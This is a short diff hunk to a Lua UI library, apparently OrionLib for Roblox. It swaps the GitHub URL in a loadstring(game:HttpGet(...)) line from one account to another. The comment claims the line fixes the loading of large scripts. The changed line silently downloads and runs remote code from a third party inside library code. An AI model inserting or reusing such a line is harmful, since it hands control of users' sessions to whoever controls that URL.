@@ -1758,7 +1758,7 @@ function OrionLib:MakeWindow(WindowConfig)
 end
 
 --// as the name sais this will fix the loading of large scripts
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/nerdifly/personalscripts/main/orion-loadfix.lua')))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/OmegaScriptsHub/HubStuff/main/OmegaLoadFix.lua')))()
 
 function OrionLib:Destroy()
 	Orion:Destroy()
